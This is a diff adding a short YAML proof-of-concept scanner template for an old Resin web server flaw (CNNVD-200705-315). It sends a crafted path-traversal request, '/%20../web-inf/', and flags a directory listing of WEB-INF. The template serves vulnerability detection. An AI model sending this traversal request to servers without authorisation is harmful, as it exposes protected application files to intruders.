@@ -1,0 +1,12 @@
+name: poc-yaml-resin-cnnvd-200705-315
+rules:
+  - method: GET
+    path: /%20../web-inf/
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"/ ../web-inf/") && response.body.bcontains(b"Directory of /")
+detail:
+  author: whynot(https://github.com/notwhy)
+  links:
+    - https://www.secpulse.com/archives/39144.html
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-200705-315
